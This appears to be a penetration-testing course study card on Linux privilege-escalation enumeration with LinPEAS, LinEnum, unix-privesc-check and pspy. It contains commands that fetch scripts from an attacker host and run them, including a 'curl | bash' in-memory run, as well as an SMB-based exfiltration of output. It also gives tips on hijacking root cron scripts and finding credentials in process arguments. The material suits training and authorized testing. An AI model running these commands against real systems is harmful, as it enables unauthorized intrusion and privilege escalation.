title: LinPEAS + Automated Linux Enum
body: Module 18.1.3: run automated tools first for speed, but they miss custom configs. Always supplement with manual enum. LinPEAS color codes: RED = high priority, YELLOW = interesting.
cmd:
# ── LINPEAS ───────────────────────────────────────────
# On Kali:
# cp /usr/share/peass/linpeas/linpeas.sh .
# python3 -m http.server 80

# Transfer and run (save output)
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/linpeas_out.txt

# Or run in memory (no disk touch)
curl http://$LHOST/linpeas.sh | bash

# If /tmp is noexec:
cd /dev/shm && wget http://$LHOST/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh

# Exfil output to Kali
# impacket-smbserver -smb2support kali . -username user -password pass
# On target:
# mount.cifs //$LHOST/kali /mnt -o username=user,password=pass
# cp /tmp/linpeas_out.txt /mnt/

# ── LINENUM ───────────────────────────────────────────
wget http://$LHOST/LinEnum.sh -O /tmp/le.sh
chmod +x /tmp/le.sh && /tmp/le.sh

# ── UNIX-PRIVESC-CHECK (pre-installed on Kali) ────────
# Already on Kali: /usr/bin/unix-privesc-check
# Transfer to target:
scp /usr/bin/unix-privesc-check user@$ip:/tmp/
./unix-privesc-check standard > /tmp/output.txt
./unix-privesc-check detailed > /tmp/output_detailed.txt
cat /tmp/output.txt | grep -i "WARNING"


# ── PSPY — WATCH PROCESSES WITHOUT ROOT (expanded) ────
# Use pspy when:
#   - linpeas shows nothing obvious and you're stuck
#   - you suspect a cron job but can't read /var/spool/cron/crontabs/root
#   - you want to CONFIRM a cron is running before modifying a script
#   - you see a writable script in /opt/ and want proof root runs it
#
# Download pspy (match architecture):
wget http://$LHOST/pspy64 -O /tmp/pspy64   # 64-bit (most common)
wget http://$LHOST/pspy32 -O /tmp/pspy32   # 32-bit
chmod +x /tmp/pspy64 && /tmp/pspy64
# Let it run 2-3 minutes — cron fires every minute at :00 and :30
# Ctrl+C to stop

# ── READING PSPY OUTPUT ──────────────────────────────
# The critical line format:
# CMD: UID=0   PID=2434   | /bin/sh /opt/log-backup.sh
#       ^^^^^                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#   root = UID 0             this is what root is running
#
# Real example from Flu (CVE-2022-26134 box):
# 2023/12/13 09:52:01 CMD: UID=0  PID=2431 | /usr/sbin/CRON -f -P
# 2023/12/13 09:52:01 CMD: UID=0  PID=2434 | /bin/sh /opt/log-backup.sh
#   → /opt/log-backup.sh is owned by confluence (you) → instant root
#
# Filter to only root processes:
/tmp/pspy64 | grep "UID=0"
#
# What to look for:
#   UID=0 + script path you own or can write      = modify script → root
#   UID=0 + script calling relative binary        = PATH hijack
#   UID=0 + script reading/writing /tmp files     = race condition possible
#   UID=0 + sshpass -p / mysql -p / curl -u       = creds in args

# ── PSPY vs INFERENCE ────────────────────────────────
# Inference (faster, no file transfer needed):
#   Script you own + writes to /root/ or /etc/shadow = root runs it
#   Good for: quick assessment, no internet, restricted boxes
#
# pspy (definitive, no guessing):
#   Shows exact UID, PID, and full command of everything running
#   Good for: confirmation before modifying, finding hidden cron jobs,
#             discovering jobs linpeas missed (custom intervals, systemd timers)
#
# On exam: inference first, pspy if you're not sure

# ── LINPEAS COLOR GUIDE ───────────────────────────────
# RED/YELLOW  = 95%+ chance of privesc vector
# GREEN       = good for the attacker (interesting config)
# Focus areas in order:
# 1. Sudo version + CVEs
# 2. SUID binaries
# 3. Cron jobs
# 4. Writable files owned by root
# 5. Services running as root
# 6. Password files / history
# 7. Network services on loopback

# ══════════════════════════════════════════════════
# READ: INTERNAL PORTS (services not in your nmap)
# ══════════════════════════════════════════════════
# In the 'Active Ports' section of linpeas output:
#   tcp LISTEN 0 4096 0.0.0.0:10000 0.0.0.0:*   ← Webmin
#   tcp LISTEN 0 128  127.0.0.1:3306 0.0.0.0:*   ← MySQL localhost-only
#
# Cross-reference with your external nmap scan:
#   - Port IN linpeas but NOT in nmap scan = filtered/localhost-only
#   - These services are reachable via SSH local port forward
#
# Check the running processes to identify what's on each port:
#   /usr/bin/perl .../miniserv.pl → Webmin (port 10000, runs as root)
#   mysqld                         → MySQL (port 3306)
#   java -jar jenkins.war          → Jenkins (port 8080)
#
# SSH local port forward to reach them:
#   ssh -L 10000:127.0.0.1:10000 <user>@<IP>
#   Then: https://127.0.0.1:10000
warn: LinPEAS misses custom one-off configs — the thing that gets you root is often not in the automated output. Always check bash history, env vars, and cron scripts manually.

choices.label: Found internal port (not in nmap) — port forward to reach it
Webmin on port 10000 — forward and exploit
Run the ordered Linux privesc checklist
Cron job writable / pspy shows UID=0 running your script
